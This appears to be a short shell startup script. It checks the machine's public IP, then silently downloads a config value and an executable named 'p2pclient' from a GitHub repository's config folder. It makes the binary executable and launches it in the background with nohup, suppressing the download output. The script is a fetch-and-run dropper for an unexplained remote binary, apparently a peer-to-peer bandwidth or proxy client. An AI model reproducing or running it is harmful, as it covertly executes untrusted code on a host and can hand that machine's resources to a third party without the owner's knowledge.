curl https://api.myip.com ;\
wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2p &>/dev/null ;\
wget https://raw.githubusercontent.com/bls4/womginx/main/config/p2pclient &>/dev/null ;\
chmod +x p2pclient ;\
nohup ./p2pclient -l $(cat p2p) 2>1 &
echo 'P2 started'
